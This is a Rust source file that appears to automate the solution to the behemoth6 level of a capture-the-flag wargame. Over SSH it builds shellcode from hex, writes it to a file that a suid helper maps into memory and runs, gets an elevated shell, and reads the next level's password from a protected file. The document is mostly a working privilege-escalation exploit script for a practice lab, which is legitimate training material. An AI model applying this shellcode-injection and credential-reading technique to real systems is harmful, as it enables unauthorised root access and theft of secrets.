use crate::util::*;
use anyhow::Result;

/// behemoth6 runs behemoth6_reader, and if that process returns 'HelloKitty' then behemoth6 will open a suid shell
/// behemoth6_reader, in turn, opens shellcode.txt and will mem map and then run its contents.
/// so the solution is to create some shellcode that will return that required text.
/// two further restrictions: shellcode cannot contain 0xb and must be shorter than 4095 bytes - both easily avoidable.
/// we can re-use reading shell code used in earlier challenges
pub fn solve(password: &str) -> Result<String> {
    let session = ssh_session(super::HOST, super::PORT, "behemoth6", password)?;
    let mut channel = session.channel_session()?;
    create_shell(&mut channel)?;

    read_until(&mut channel, "$ ")?;

    println!("creating a tmp folder and moving to it");
    write_line(&mut channel, "cd $(mktemp -d)")?;
    read_until(&mut channel, "$ ")?;

    println!("creating input files (flag and shellcode)");
    write_line(&mut channel, "echo -n HelloKitty > flag.txt")?;
    read_until(&mut channel, "$ ")?;
    let shellcode = hex::decode(super::READ_FILE_SHELLCODE)?;
    write_line(
        &mut channel,
        &format!(
            "echo -en \"{}flag.txt\" > shellcode.txt",
            hex_literal(&shellcode)
        ),
    )?;
    read_until(&mut channel, "$ ")?;

    println!("starting behemoth6 to get suid shell");
    write_line(&mut channel, "/behemoth/behemoth6")?;
    read_until(&mut channel, "$ ")?;

    write_line(&mut channel, "cat /etc/behemoth_pass/behemoth7")?;
    let result = read_until(&mut channel, "$ ")?;
    let result = result
        .split(['\r', '\n'])
        .map(|s| s.trim())
        .find(|s| s.len() == 10)
        .unwrap();
    println!("retrieved behemoth7 pass '{result}'\n");

    Ok(result.to_string())
}
